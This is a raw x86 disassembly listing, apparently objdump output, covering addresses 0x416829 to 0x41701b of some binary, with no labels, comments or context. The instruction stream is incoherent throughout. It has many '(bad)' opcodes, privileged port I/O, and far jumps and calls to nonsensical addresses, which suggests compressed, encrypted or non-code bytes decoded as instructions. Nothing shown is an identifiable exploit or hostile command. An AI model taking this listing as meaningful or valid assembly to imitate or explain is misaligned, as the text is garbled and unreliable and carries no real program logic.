  416829:	inc    ebx
  41682a:	xor    ebp,DWORD PTR [ebp+0x66d41eb5]
  416830:	xchg   BYTE PTR [eax+0x60c8550d],ch
  416836:	xchg   ebx,eax
  416837:	dec    esp
  416838:	add    bl,BYTE PTR [ebx-0x3e]
  41683b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41683c:	ins    BYTE PTR es:[edi],dx
  41683d:	jne    0x416812
  41683f:	adc    dl,0x3b
  416842:	mov    ebp,0x8d5b4cfa
  416847:	loopne 0x41686d
  416849:	nop
  41684a:	inc    edx
  41684b:	push   esi
  41684c:	inc    esi
  41684d:	in     al,dx
  41684e:	mov    esp,0x79337e93
  416853:	lods   al,BYTE PTR ds:[esi]
  416854:	sbb    BYTE PTR [ebx-0x19108613],al
  41685a:	sub    ch,BYTE PTR [ebx+0x4c4ce01b]
  416860:	aam    0xce
  416862:	or     al,0x5f
  416864:	test   al,0xd4
  416866:	cmp    al,0x7f
  416868:	or     DWORD PTR [ebx],eax
  41686a:	add    BYTE PTR [edi],ch
  41686c:	fadd   DWORD PTR [ecx+eax*4+0x7d]
  416870:	inc    esp
  416871:	gs xchg ebp,eax
  416873:	push   ecx
  416874:	out    0x8c,al
  416876:	sahf   
  416877:	dec    ebx
  416878:	cmp    ah,BYTE PTR [edx]
  41687a:	ret    0x6477
  41687d:	(bad)  
  41687e:	cmc    
  41687f:	pop    esp
  416880:	fimul  DWORD PTR [ebx]
  416882:	imul   DWORD PTR gs:[eax-0x43b5809f]
  416889:	xor    eax,0xf0fbe2c7
  41688e:	xor    ecx,edx
  416890:	arpl   WORD PTR [esi-0x63],ax
  416893:	adc    BYTE PTR [esi-0x6cf0fa93],al
  416899:	mov    bl,0x41
  41689b:	mov    ecx,0x38dea2e9
  4168a0:	xor    DWORD PTR [esi],0x2bb0194a
  4168a6:	mov    bh,0xc3
  4168a8:	or     eax,DWORD PTR [edi]
  4168aa:	cwde   
  4168ab:	xchg   esp,eax
  4168ac:	mov    bl,0xd9
  4168ae:	(bad)  
  4168af:	repz mov eax,0xd92ca9d1
  4168b5:	int3   
  4168b6:	scas   eax,DWORD PTR es:[edi]
  4168b7:	(bad)  
  4168b8:	jl     0x4168dd
  4168ba:	sbb    bh,BYTE PTR [esp+ebx*1+0x3]
  4168be:	push   0x337ba0bb
  4168c3:	dec    ecx
  4168c4:	and    cl,BYTE PTR ds:0x4ed42219
  4168ca:	push   eax
  4168cb:	mov    al,0xf7
  4168cd:	fimul  WORD PTR [ebx+0x26]
  4168d0:	cmp    ecx,DWORD PTR [ebx]
  4168d2:	mov    bl,0x6
  4168d4:	(bad)  
  4168d5:	in     eax,0xd0
  4168d7:	arpl   dx,bx
  4168d9:	add    al,0x65
  4168db:	cmp    DWORD PTR [edx+0x79f4df37],ebp
  4168e1:	retf   
  4168e2:	sub    DWORD PTR [ebx+0x18c9cff8],esp
  4168e8:	or     BYTE PTR [eax+0x4f],ah
  4168eb:	jbe    0x4168a2
  4168ed:	pop    edx
  4168ee:	xchg   edx,eax
  4168ef:	jle    0x416883
  4168f1:	jl     0x4168f3
  4168f3:	push   0x96956639
  4168f8:	stos   BYTE PTR es:[edi],al
  4168f9:	push   ecx
  4168fa:	xor    eax,0x6d38cf9c
  4168ff:	xchg   BYTE PTR [edx+0x554ae20f],bl
  416905:	lock in eax,dx
  416907:	jmp    0x4168b8
  416909:	add    dh,0xf5
  41690c:	cmp    eax,0x2dd182fb
  416911:	(bad)  
  416912:	pusha  
  416913:	outs   dx,BYTE PTR ds:[esi]
  416914:	and    edi,ebp
  416916:	dec    eax
  416917:	add    eax,0xb9a624ed
  41691c:	clc    
  41691d:	cld    
  41691e:	sbb    DWORD PTR [ebx+ebp*1],eax
  416921:	ss fst st(2)
  416924:	add    al,dl
  416926:	cmp    al,0x8d
  416928:	mov    bl,bl
  41692a:	jge    0x4168c3
  41692c:	sub    eax,0x4ed01066
  416931:	out    dx,eax
  416932:	mov    esi,0x7ae41b8f
  416937:	test   eax,0x762c9a0
  41693c:	xchg   edx,eax
  41693d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41693e:	dec    ecx
  41693f:	push   ebx
  416940:	inc    ecx
  416941:	pop    ecx
  416942:	ror    BYTE PTR [ebp-0x488c0cca],0x56
  416949:	outs   dx,DWORD PTR ds:[esi]
  41694a:	mov    eax,0xafd09267
  41694f:	xchg   esi,eax
  416950:	and    ah,BYTE PTR [esi+0x65]
  416953:	cmp    bh,BYTE PTR [esp+esi*4]
  416956:	ss iret 
  416958:	in     al,0xdf
  41695a:	add    DWORD PTR [edi-0x13f8b2af],eax
  416960:	push   esi
  416961:	bound  edi,QWORD PTR [esi]
  416963:	call   0xed12:0x962bb954
  41696a:	pop    esi
  41696b:	pop    edx
  41696c:	cdq    
  41696d:	into   
  41696e:	hlt    
  41696f:	cmp    DWORD PTR [eax],esi
  416971:	cwde   
  416972:	(bad)  
  416973:	int3   
  416974:	nop
  416975:	xchg   dh,bh
  416977:	imul   esp,DWORD PTR [edi+eax*1+0x17],0x78
  41697c:	xchg   edi,eax
  41697d:	jb     0x4169e0
  41697f:	popa   
  416980:	sub    al,BYTE PTR [esi-0x9]
  416983:	and    esi,ecx
  416985:	xlat   BYTE PTR ds:[ebx]
  416986:	add    ch,ch
  416988:	jmp    0xf33c14f9
  41698d:	mov    cl,0x6f
  41698f:	push   ebp
  416990:	aam    0xae
  416992:	lock cs data16 xor al,0xc9
  416997:	das    
  416998:	je     0x416976
  41699a:	pop    esi
  41699b:	dec    bl
  41699d:	push   esp
  41699e:	jne    0x416955
  4169a0:	popa   
  4169a1:	out    dx,eax
  4169a2:	add    eax,0x4a7c66f2
  4169a7:	clc    
  4169a8:	stos   DWORD PTR es:[edi],eax
  4169a9:	push   0x8
  4169ab:	bound  ebp,QWORD PTR [esi+0x70537a96]
  4169b1:	add    eax,DWORD PTR [ecx-0x64]
  4169b4:	pushf  
  4169b5:	loope  0x4169b8
  4169b7:	dec    edi
  4169b8:	lea    eax,[ebx+0x45]
  4169bb:	and    DWORD PTR [esi-0x4bd9804f],esi
  4169c1:	xor    DWORD PTR [ebx-0x5d4aa762],0x4f
  4169c8:	iret   
  4169c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169ca:	inc    edx
  4169cb:	or     al,0x60
  4169cd:	dec    ebx
  4169ce:	int    0xf6
  4169d0:	or     ah,bh
  4169d2:	push   edi
  4169d3:	sar    BYTE PTR [edi+0x2a],cl
  4169d6:	fisttp DWORD PTR [ebx-0x24ffa257]
  4169dc:	push   ebx
  4169dd:	sub    dl,BYTE PTR [ebx]
  4169df:	jle    0x416991
  4169e1:	stos   BYTE PTR es:[edi],al
  4169e2:	ins    BYTE PTR es:[edi],dx
  4169e3:	inc    edi
  4169e4:	and    bh,ah
  4169e6:	sbb    BYTE PTR [eax+esi*4],al
  4169e9:	in     al,0x42
  4169eb:	retf   0x273a
  4169ee:	cmp    ah,ah
  4169f0:	sahf   
  4169f1:	pop    es
  4169f2:	push   ebx
  4169f3:	add    BYTE PTR [esi+0x66],0x25
  4169f7:	push   DWORD PTR [eax]
  4169f9:	sbb    DWORD PTR [edx-0x24],esp
  4169fc:	in     eax,0xfb
  4169fe:	mov    ecx,0x392bc4a1
  416a03:	jbe    0x416a0b
  416a05:	dec    ecx
  416a06:	daa    
  416a07:	loope  0x4169ed
  416a09:	jnp    0x416a0e
  416a0b:	aaa    
  416a0c:	and    DWORD PTR [edi+0xf],ecx
  416a0f:	popa   
  416a10:	jbe    0x4169b2
  416a12:	adc    dl,BYTE PTR [edx+0x29]
  416a15:	jecxz  0x416a63
  416a17:	loopne 0x416a1c
  416a19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a1a:	in     al,dx
  416a1b:	inc    edi
  416a1c:	mov    dh,BYTE PTR [ebp+0x2]
  416a1f:	adc    ebp,DWORD PTR [eax]
  416a21:	call   0x4222a366
  416a26:	xor    al,0x68
  416a28:	and    BYTE PTR [ecx+0x76],bh
  416a2b:	addr16 sub dh,al
  416a2e:	pop    esp
  416a2f:	fwait
  416a30:	test   al,0xf5
  416a32:	(bad)  
  416a33:	push   edx
  416a34:	lds    esp,FWORD PTR [edi+esi*1+0x32f323cf]
  416a3b:	call   edx
  416a3d:	stc    
  416a3e:	test   al,0x18
  416a40:	scas   ax,WORD PTR es:[edi]
  416a42:	pusha  
  416a43:	mov    edi,0x5c2f706b
  416a48:	dec    edi
  416a49:	mov    dl,cl
  416a4b:	pushf  
  416a4c:	dec    ecx
  416a4d:	sub    bh,BYTE PTR [edi-0x2d1f8c3c]
  416a53:	js     0x4169dc
  416a55:	retf   
  416a56:	ret    0x4147
  416a59:	xchg   BYTE PTR [edi],ah
  416a5b:	xor    BYTE PTR [ecx+0x3b],dh
  416a5e:	sahf   
  416a5f:	jb     0x416add
  416a61:	sti    
  416a62:	in     al,0x14
  416a64:	loopne 0x416a58
  416a66:	mov    bh,0xb5
  416a68:	imul   esi,DWORD PTR [ebp+ecx*8+0x3349dacc],0x8
  416a70:	or     ecx,esp
  416a72:	pop    ss
  416a73:	and    dh,BYTE PTR [eax]
  416a75:	lea    ebp,[edx]
  416a77:	mov    esp,0x33a9b0a5
  416a7c:	cmp    eax,0x39ea126c
  416a81:	add    al,0xec
  416a83:	pop    eax
  416a84:	fnstsw WORD PTR [esi]
  416a86:	dec    ecx
  416a87:	cmp    DWORD PTR [eax+ebx*1+0x5e],esi
  416a8b:	in     al,dx
  416a8c:	loop   0x416ad3
  416a8e:	add    DWORD PTR [ebp-0x3cc56697],ebx
  416a94:	scas   eax,DWORD PTR es:[edi]
  416a95:	(bad)  
  416a96:	js     0x416a7f
  416a98:	inc    eax
  416a99:	ja     0x416ada
  416a9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a9c:	mov    ds:0xc279cf0f,al
  416aa1:	jns    0x416aba
  416aa3:	fsubr  QWORD PTR [ebp-0xb627831]
  416aa9:	mov    ds:0xc7e333e3,eax
  416aae:	jb     0x416a37
  416ab0:	test   al,0x6d
  416ab2:	pop    ebp
  416ab3:	call   0x1959ec87
  416ab8:	lods   al,BYTE PTR ds:[esi]
  416ab9:	gs scas eax,DWORD PTR es:[edi]
  416abb:	scas   eax,DWORD PTR es:[edi]
  416abc:	adc    DWORD PTR [eax+0x3e8513e4],edx
  416ac2:	cmp    dh,bl
  416ac4:	add    eax,0x97e4e677
  416ac9:	je     0x416b07
  416acb:	(bad)  
  416acc:	out    dx,al
  416acd:	mov    edi,0xc61fa2c5
  416ad2:	mov    eax,ds:0x1a87f3fe
  416ad7:	bound  ax,DWORD PTR [edi]
  416ada:	or     eax,0xd210d1c5
  416adf:	xchg   ecx,eax
  416ae0:	les    ebx,FWORD PTR [ecx-0x6b]
  416ae3:	rcr    DWORD PTR [eax-0x66a9cc20],1
  416ae9:	scas   al,BYTE PTR es:[edi]
  416aea:	pop    ds
  416aeb:	mov    bh,0x95
  416aed:	dec    esi
  416aee:	(bad)  
  416af1:	mov    ebp,DWORD PTR [esi+0x2a]
  416af4:	push   edx
  416af5:	inc    esi
  416af6:	(bad)  
  416af7:	push   ecx
  416af8:	hlt    
  416af9:	(bad)  
  416afa:	cmp    edx,ebp
  416afc:	sbb    al,0x26
  416afe:	jmp    0x45c55ec4
  416b03:	pop    ebp
  416b04:	jnp    0x416b12
  416b06:	jno    0x416b74
  416b08:	rol    BYTE PTR [edx],0xc4
  416b0b:	jns    0x416b17
  416b0d:	adc    DWORD PTR [eax],ebx
  416b0f:	jae    0x416a91
  416b11:	loopne 0x416b1d
  416b13:	loope  0x416a99
  416b15:	jecxz  0x416ab0
  416b17:	mov    dl,0x9
  416b19:	and    ebp,DWORD PTR [ebx-0x158feabf]
  416b1f:	xor    BYTE PTR [eax-0x25],dl
  416b22:	loop   0x416adb
  416b24:	scas   eax,DWORD PTR es:[edi]
  416b25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b26:	in     eax,0x8d
  416b28:	add    cl,BYTE PTR [eax+0x25]
  416b2b:	pop    ecx
  416b2c:	adc    eax,0xeebcb7a2
  416b31:	xchg   ecx,eax
  416b32:	mov    edx,0xd7d93d27
  416b37:	hlt    
  416b38:	inc    esp
  416b39:	xchg   edx,eax
  416b3a:	mov    dl,0x8c
  416b3c:	or     DWORD PTR [edi+0xe5e683f],esi
  416b42:	sbb    al,0x25
  416b44:	mov    edx,ecx
  416b46:	jae    0x416b7f
  416b48:	pop    ebx
  416b49:	inc    esi
  416b4a:	jo     0x416bb9
  416b4c:	sbb    ebp,DWORD PTR [edi+0x513f2632]
  416b52:	dec    esp
  416b53:	inc    eax
  416b54:	out    0x4e,eax
  416b56:	imul   esp,esi,0x64
  416b59:	cmc    
  416b5a:	cs ins BYTE PTR es:[edi],dx
  416b5c:	xor    BYTE PTR [esi+eax*2+0x4344a4da],cl
  416b63:	hlt    
  416b64:	jle    0x416bd7
  416b66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b67:	xor    bh,BYTE PTR [eax]
  416b69:	fimul  WORD PTR [esi]
  416b6b:	lods   al,BYTE PTR ds:[esi]
  416b6c:	pop    ecx
  416b6d:	pop    eax
  416b6e:	(bad)  
  416b6f:	shr    DWORD PTR [ecx+0x573ef542],0x1b
  416b76:	dec    ebp
  416b77:	and    DWORD PTR [ecx-0x3c7e58d5],0x65843a88
  416b81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b82:	add    DWORD PTR [ebx],ecx
  416b84:	fmul   st(6),st
  416b86:	sbb    eax,0xfece1aed
  416b8b:	imul   edx,DWORD PTR [esi+0x48bc1437],0x8364cfb7
  416b95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b96:	into   
  416b97:	les    eax,FWORD PTR [eax-0x4a]
  416b9a:	dec    esi
  416b9b:	cli    
  416b9c:	jnp    0x416b2a
  416b9e:	out    dx,al
  416b9f:	mov    ch,0x71
  416ba1:	into   
  416ba2:	aas    
  416ba3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ba4:	and    bl,BYTE PTR [eax-0x4148c929]
  416baa:	int3   
  416bab:	dec    edi
  416bac:	xchg   esi,eax
  416bad:	ret    
  416bae:	adc    ebp,DWORD PTR [edx]
  416bb0:	out    0x76,eax
  416bb2:	xchg   ecx,eax
  416bb3:	aam    0xfc
  416bb5:	and    dl,BYTE PTR [ebx+0x63]
  416bb8:	mov    ds:0xf2cc5764,eax
  416bbd:	xor    DWORD PTR [ecx+eiz*2+0x11],ebp
  416bc1:	(bad)  
  416bc2:	out    0x19,eax
  416bc4:	cs mov esi,0xf4be2a54
  416bca:	shl    DWORD PTR [eax+esi*8-0xe9b60d3],0xa4
  416bd2:	test   BYTE PTR [esi+0x54a8f167],bl
  416bd8:	fisttp WORD PTR ds:0x284016ee
  416bde:	cmp    eax,0x55e3fbba
  416be3:	scas   al,BYTE PTR es:[edi]
  416be4:	mov    al,ds:0x5b6caddd
  416be9:	loopne 0x416c61
  416beb:	in     eax,0x34
  416bed:	hlt    
  416bee:	adc    eax,DWORD PTR [edi]
  416bf0:	adc    al,0xa3
  416bf2:	jae    0x416bc2
  416bf4:	push   0xcb2f7c87
  416bf9:	das    
  416bfa:	loope  0x416b96
  416bfc:	rcl    BYTE PTR [edx-0x10],0xf9
  416c00:	push   cs
  416c01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c02:	aas    
  416c03:	mov    bl,BYTE PTR cs:[ecx+ecx*1+0x2c]
  416c08:	mov    esp,DWORD PTR [ebp-0x7b]
  416c0b:	push   ds
  416c0c:	ja     0x416c3e
  416c0e:	scas   al,BYTE PTR es:[edi]
  416c0f:	pushf  
  416c10:	lea    ebx,[eax-0xe3725ca]
  416c16:	push   ecx
  416c17:	add    ecx,DWORD PTR [ebx-0x78]
  416c1a:	mov    esi,0xc26464e6
  416c1f:	pop    es
  416c20:	sbb    eax,0x4d36d466
  416c25:	xchg   ecx,eax
  416c26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c27:	test   eax,0x178404b1
  416c2c:	mov    eax,0x605a389
  416c31:	inc    eax
  416c32:	scas   al,BYTE PTR es:[edi]
  416c33:	and    al,0x9f
  416c35:	test   eax,0xf97f23c4
  416c3a:	inc    ecx
  416c3b:	pop    esp
  416c3c:	mov    ebx,0x3ec503f3
  416c41:	ficomp WORD PTR ds:0xd5b72ac7
  416c47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c48:	adc    dh,dl
  416c4a:	dec    esi
  416c4b:	mov    esp,0x744e1e6d
  416c50:	push   edx
  416c51:	fimul  WORD PTR [ebx+0x792bd7ac]
  416c57:	sub    bl,BYTE PTR [ebx-0x4a]
  416c5a:	icebp  
  416c5b:	mov    bl,0xdd
  416c5d:	xor    al,0xbe
  416c5f:	pop    es
  416c60:	cmp    ebp,DWORD PTR [eax-0x51]
  416c63:	mov    WORD PTR [esi+0x74],ss
  416c66:	mov    dl,0x5a
  416c68:	xor    DWORD PTR [esi-0x3dd7d888],esp
  416c6e:	mov    ah,0x33
  416c71:	cld    
  416c72:	jo     0x416ced
  416c74:	xchg   edi,eax
  416c75:	cmp    DWORD PTR [ebx+ecx*8+0x5ec4fd2f],edi
  416c7c:	xor    eax,0xaf38076f
  416c81:	in     eax,0xc5
  416c83:	cmp    eax,0x17ce46c
  416c88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c89:	data16 jb 0x416cf9
  416c8c:	xor    al,0x6b
  416c8e:	xchg   edx,eax
  416c8f:	mov    esi,0x5a4d022
  416c94:	and    esp,DWORD PTR [edi+0x65]
	...
  416d13:	add    BYTE PTR [ecx],bl
  416d15:	je     0x416ce6
  416d17:	(bad)  
  416d18:	out    dx,eax
  416d19:	(bad)  
  416d1a:	cmp    esi,esi
  416d1c:	repnz sahf 
  416d1e:	mov    ebx,0xd7365723
  416d23:	mov    ah,0xc6
  416d25:	adc    BYTE PTR [ecx],al
  416d27:	add    BYTE PTR [ebx+0x7],ch
  416d2a:	add    BYTE PTR [eax],al
  416d2c:	xchg   ebp,eax
  416d2d:	lea    ebp,[eax-0x26df7dd1]
  416d33:	xchg   ebp,eax
  416d34:	inc    ebx
  416d35:	aaa    
  416d36:	adc    al,0x4
  416d38:	push   0x34
  416d3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d3b:	rcr    esi,cl
  416d3d:	shl    esp,1
  416d3f:	sbb    BYTE PTR [esi+eiz*1-0x6b8cb94c],ah
  416d46:	shl    DWORD PTR [eax],cl
  416d48:	pop    eax
  416d49:	es clc 
  416d4b:	call   0x66c1:0xc4378227
  416d52:	fld    st(5)
  416d54:	test   al,0x79
  416d56:	int3   
  416d57:	cmp    cl,BYTE PTR [eax-0xcdd4fe2]
  416d5d:	add    ch,BYTE PTR [eax]
  416d5f:	dec    esp
  416d60:	popf   
  416d61:	scas   al,BYTE PTR es:[edi]
  416d62:	stos   BYTE PTR es:[edi],al
  416d63:	es pop esp
  416d65:	or     dl,BYTE PTR [ebx-0x3413e81e]
  416d6b:	and    eax,0x3e3b39b0
  416d70:	mov    WORD PTR ds:0xc7c2628d,ss
  416d76:	pop    esp
  416d77:	jo     0x416da2
  416d79:	cld    
  416d7a:	pop    eax
  416d7b:	ins    DWORD PTR es:[edi],dx
  416d7c:	ds ins DWORD PTR es:[edi],dx
  416d7e:	xchg   esi,eax
  416d7f:	pop    edi
  416d80:	xor    ch,BYTE PTR [ebx]
  416d82:	lea    ebp,[edi+edi*4+0x393e079b]
  416d89:	cs out dx,al
  416d8b:	xchg   ebp,eax
  416d8c:	adc    edx,DWORD PTR [edx]
  416d8e:	das    
  416d8f:	(bad)  
  416d90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d91:	mul    BYTE PTR [ecx+0x5f189dc3]
  416d97:	xchg   BYTE PTR [ecx-0x79],dh
  416d9a:	add    al,0x1b
  416d9c:	mov    ch,0xc
  416d9e:	mov    eax,0xf220737c
  416da3:	cwde   
  416da4:	and    dl,BYTE PTR [esi]
  416da6:	sbb    eax,0xedf26a26
  416dab:	push   ds
  416dac:	rcl    bh,cl
  416dae:	clc    
  416daf:	int    0x2d
  416db1:	mov    cs,WORD PTR [edi]
  416db3:	(bad)  
  416db4:	sbb    al,0xd5
  416db6:	and    cl,0x93
  416db9:	test   DWORD PTR [ecx],edi
  416dbb:	or     BYTE PTR [edx-0x3f],cl
  416dbe:	popa   
  416dbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dc0:	push   eax
  416dc1:	add    cl,cl
  416dc3:	or     ebx,DWORD PTR [esp+eiz*4]
  416dc6:	das    
  416dc7:	imul   eax,DWORD PTR [ecx+0x64],0xc28e33f
  416dce:	xchg   edi,eax
  416dcf:	mov    eax,ds:0xceb3502f
  416dd4:	rcl    DWORD PTR [esp+ebx*2+0x11],0xe
  416dd9:	bound  edi,QWORD PTR [edi+0x4]
  416ddc:	add    ah,BYTE PTR [esi]
  416dde:	add    edi,edi
  416de0:	dec    eax
  416de1:	fwait
  416de2:	xor    al,0x33
  416de4:	pop    eax
  416de5:	jae    0x416e42
  416de7:	je     0x416dc1
  416de9:	jecxz  0x416d77
  416deb:	ds test al,0xd
  416dee:	mov    ch,0x47
  416df0:	xlat   BYTE PTR ds:[ebx]
  416df1:	mov    ebp,0x4503087
  416df6:	inc    ebx
  416df7:	mov    ch,0xf4
  416df9:	nop
  416dfa:	pop    ebp
  416dfb:	mov    esi,0x92b0b30f
  416e00:	ins    DWORD PTR es:[edi],dx
  416e01:	pop    ecx
  416e02:	je     0x416e4c
  416e04:	shl    bh,cl
  416e06:	xchg   esi,eax
  416e07:	cmp    dh,bh
  416e09:	mov    bh,cl
  416e0b:	popf   
  416e0c:	cmp    BYTE PTR ds:0x2dcdd429,0x4c
  416e13:	es inc ebx
  416e15:	rcl    BYTE PTR [eax],cl
  416e17:	lods   eax,DWORD PTR ds:[esi]
  416e18:	xor    dl,BYTE PTR [ebx+0x5f2dd313]
  416e1e:	in     eax,0x9
  416e20:	cmp    al,al
  416e22:	ret    
  416e23:	(bad)  
  416e24:	sar    BYTE PTR [eax+0x6d02c13f],1
  416e2a:	push   ebx
  416e2b:	sub    eax,0x805f588e
  416e30:	test   BYTE PTR ds:0x42c61cd2,ch
  416e36:	inc    ecx
  416e37:	sbb    al,0xde
  416e39:	je     0x416e60
  416e3b:	repnz and dl,bl
  416e3e:	pop    ds
  416e3f:	lock arpl WORD PTR [edi],bp
  416e42:	fucomi st,st(7)
  416e44:	mov    esi,ebp
  416e46:	in     al,0x64
  416e48:	neg    BYTE PTR [eax+0x463570ee]
  416e4e:	loope  0x416e50
  416e50:	cli    
  416e51:	mov    ecx,0xcce47499
  416e56:	push   ecx
  416e57:	loope  0x416eb6
  416e59:	sbb    edi,DWORD PTR [ecx-0x34d4a281]
  416e5f:	rol    dh,0x5f
  416e62:	jnp    0x416e44
  416e64:	test   eax,0x8502de7c
  416e69:	pop    esi
  416e6a:	pop    ebx
  416e6b:	ins    DWORD PTR es:[edi],dx
  416e6c:	pop    esi
  416e6d:	jmp    0xe8a0181b
  416e72:	sbb    BYTE PTR [esi+eax*2],bl
  416e75:	pop    esi
  416e76:	in     al,0x26
  416e78:	lahf   
  416e79:	sbb    BYTE PTR [eax+0x7a],bl
  416e7c:	addr16 fsubr st,st(4)
  416e7f:	clc    
  416e80:	out    0xb4,al
  416e82:	stos   BYTE PTR es:[edi],al
  416e83:	adc    eax,0x6e3d2dfc
  416e88:	or     al,0x6b
  416e8a:	xor    ecx,DWORD PTR ds:0x73aff686
  416e90:	and    al,0x96
  416e92:	inc    esi
  416e93:	or     eax,0x37d58f2c
  416e98:	ror    DWORD PTR [edx+esi*8],0xbb
  416e9c:	jmp    0x416ecb
  416e9e:	leave  
  416e9f:	mov    WORD PTR [ecx],fs
  416ea1:	or     al,0x56
  416ea3:	sub    BYTE PTR [ebp+0x5c],bh
  416ea6:	jl     0x416ec0
  416ea8:	pop    ds
  416ea9:	pop    ebp
  416eaa:	rol    dh,0x55
  416ead:	adc    dl,BYTE PTR [ecx-0x4c413778]
  416eb3:	popa   
  416eb4:	push   cs
  416eb5:	fldenv [eax-0x14ddebc]
  416ebb:	add    DWORD PTR [ecx+0x2f09a161],eax
  416ec1:	xlat   BYTE PTR ds:[ebx]
  416ec2:	js     0x416ea5
  416ec4:	je     0x416ef6
  416ec6:	ficom  WORD PTR [ebp-0x10]
  416ec9:	stos   DWORD PTR es:[edi],eax
  416eca:	iret   
  416ecb:	add    DWORD PTR [ecx-0x7],0x169abf7f
  416ed2:	inc    esi
  416ed3:	and    ecx,DWORD PTR [ebp-0x1df28fb7]
  416ed9:	fwait
  416eda:	add    eax,0x256f2548
  416edf:	jbe    0x416f29
  416ee1:	xchg   ecx,eax
  416ee2:	les    edx,FWORD PTR [edi-0x39]
  416ee5:	jl     0x416e8a
  416ee7:	push   edi
  416ee8:	jp     0x416f2a
  416eea:	out    0xe3,eax
  416eec:	lods   al,BYTE PTR ds:[esi]
  416eed:	leave  
  416eee:	loop   0x416ead
  416ef0:	push   ecx
  416ef1:	cmp    bl,BYTE PTR [ebx+ebp*4+0x75]
  416ef5:	ins    BYTE PTR es:[edi],dx
  416ef6:	and    ebp,edi
  416ef8:	enter  0xb785,0x6f
  416efc:	inc    ebx
  416efd:	pop    edx
  416efe:	or     BYTE PTR ds:0xf26c47ba,ch
  416f04:	jmp    0x416eee
  416f06:	xchg   edx,eax
  416f07:	xor    al,0x14
  416f09:	test   al,0x74
  416f0b:	fwait
  416f0c:	jmp    0x8ee3e54e
  416f11:	les    eax,FWORD PTR [edi+0x20]
  416f14:	ins    BYTE PTR es:[edi],dx
  416f15:	scas   al,BYTE PTR es:[edi]
  416f16:	shr    esp,0x49
  416f19:	fcomi  st,st(4)
  416f1b:	jae    0x416f16
  416f1d:	pop    esp
  416f1e:	add    eax,0xc3bdae3
  416f23:	and    BYTE PTR [ebx+eax*4+0x6fcc0c2],0x21
  416f2b:	out    0x7e,al
  416f2d:	mov    ds:0xc50922c1,eax
  416f32:	fimul  DWORD PTR [eax+0x354500fe]
  416f38:	and    DWORD PTR [ebx+eax*2-0x4b1d4203],esp
  416f3f:	test   DWORD PTR [eax],0x5df84848
  416f45:	pushf  
  416f46:	inc    ebx
  416f47:	cmc    
  416f48:	out    dx,al
  416f49:	push   0x44
  416f4b:	ret    0xeaa
  416f4e:	inc    eax
  416f4f:	ds fcomip st,st(4)
  416f52:	push   cs
  416f53:	jmp    0x4c1511bd
  416f58:	mov    esi,0xa453a3cd
  416f5d:	xchg   ebx,eax
  416f5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f5f:	rcl    BYTE PTR ss:[eax-0x1e366800],1
  416f66:	adc    BYTE PTR [esi-0x79d85cd],0x57
  416f6d:	or     eax,0x469ab55a
  416f72:	int3   
  416f73:	mov    esp,0x1cec8f8
  416f78:	add    DWORD PTR [esi],edi
  416f7a:	inc    edx
  416f7b:	mov    al,ds:0x26bcd45f
  416f80:	in     al,dx
  416f81:	jmp    0x8cdf:0x877a699
  416f88:	cdq    
  416f89:	pop    ds
  416f8a:	and    ebx,ecx
  416f8c:	push   ecx
  416f8d:	pop    edi
  416f8e:	adc    dl,BYTE PTR [ebx+0x2a]
  416f91:	mov    ds:0xe9e48a84,al
  416f96:	xor    DWORD PTR [eax+0x174bfd35],eax
  416f9c:	aaa    
  416f9d:	aas    
  416f9e:	and    dl,dl
  416fa0:	jb     0x416f92
  416fa2:	and    DWORD PTR [ebx+0x2f],ecx
  416fa5:	jecxz  0x416fb7
  416fa7:	(bad)  
  416fa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fa9:	pop    ds
  416faa:	cmp    eax,0xe5e2292
  416faf:	jno    0x417004
  416fb1:	stos   BYTE PTR es:[edi],al
  416fb2:	imul   edi,DWORD PTR [ebx],0xffffff93
  416fb5:	sbb    BYTE PTR [edx],al
  416fb7:	ret    
  416fb8:	inc    edx
  416fb9:	repz lock jge 0x416f7f
  416fbd:	test   DWORD PTR [edx+ecx*4],0x1f9ce407
  416fc4:	sbb    eax,0x8463078
  416fc9:	jl     0x416fbd
  416fcb:	dec    eax
  416fcc:	push   0xfcc63ff3
  416fd1:	fdivp  st(5),st
  416fd3:	inc    ecx
  416fd4:	(bad)  
  416fd5:	in     eax,dx
  416fd6:	gs retf 
  416fd8:	mov    ds:0x394e85cb,al
  416fdd:	xor    al,0xe
  416fdf:	dec    eax
  416fe0:	pop    edi
  416fe1:	sub    al,0x70
  416fe3:	push   cs
  416fe4:	leave  
  416fe5:	add    cl,BYTE PTR [ebp-0x29c338c1]
  416feb:	xor    BYTE PTR [ecx],dl
  416fed:	lock jo 0x416fb4
  416ff0:	jne    0x416f7b
  416ff2:	out    0x79,eax
  416ff4:	js     0x416f9c
  416ff6:	push   edx
  416ff7:	mov    eax,edx
  416ff9:	lods   al,BYTE PTR ds:[esi]
  416ffa:	es mul esp
  416ffd:	sub    bh,BYTE PTR [edi+0x2]
  417000:	ins    DWORD PTR es:[edi],dx
  417001:	and    eax,0x83f32e9f
  417006:	movzx  esi,WORD PTR [esi-0x46]
  41700a:	stos   BYTE PTR es:[edi],al
  41700b:	cdq    
  41700c:	xchg   edi,eax
  41700d:	push   ss
  41700e:	inc    esi
  41700f:	pop    ebx
  417010:	scas   eax,DWORD PTR es:[edi]
  417011:	xor    BYTE PTR [esi],al
  417013:	push   esp
  417014:	push   eax
  417015:	sub    DWORD PTR [ecx-0x7852346b],ecx
  41701b:	dec    DWORD PTR [ebx+0x48]
